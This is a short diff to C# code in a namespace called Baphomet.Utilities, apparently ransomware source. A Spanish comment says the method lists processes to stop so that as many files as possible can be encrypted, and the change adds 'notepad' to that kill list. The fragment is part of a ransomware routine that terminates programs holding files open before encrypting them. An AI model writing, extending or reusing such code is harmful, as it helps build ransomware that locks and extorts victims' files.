@@ -15,7 +15,7 @@ namespace Baphomet.Utilities
         //Aqui coloco los procesos que deseo detener para poder cifrar la mayor cantidad de archivos posibles.
         public void CheckProccess()
         {
-            var validProccess = new[] { "" };
+            var validProccess = new[] { "notepad" };
 
             foreach (var proccessName in validProccess)
             {
